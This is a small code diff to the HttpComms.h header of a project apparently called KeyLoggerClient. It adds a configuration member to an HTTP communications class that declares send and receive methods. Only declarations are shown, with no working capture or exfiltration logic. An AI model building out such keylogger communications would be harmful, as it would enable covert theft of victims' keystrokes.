@@ -1,3 +1,4 @@
+// KeyLoggerClient/include/communication/HttpComms.h
 #ifndef HTTPCOMMS_H
 #define HTTPCOMMS_H
 
@@ -7,7 +8,7 @@
 
 class Configuration;
 
-class HttpComms : public BaseComms {
+class HttpComms : public BaseComms {    
 public:
     explicit HttpComms(Configuration* config);
     ~HttpComms();
@@ -19,6 +20,7 @@ public:
     std::vector<uint8_t> ReceiveData() override;
     
 private:
+    Configuration* m_config;
     HINTERNET m_hSession;
     HINTERNET m_hConnect;
 };
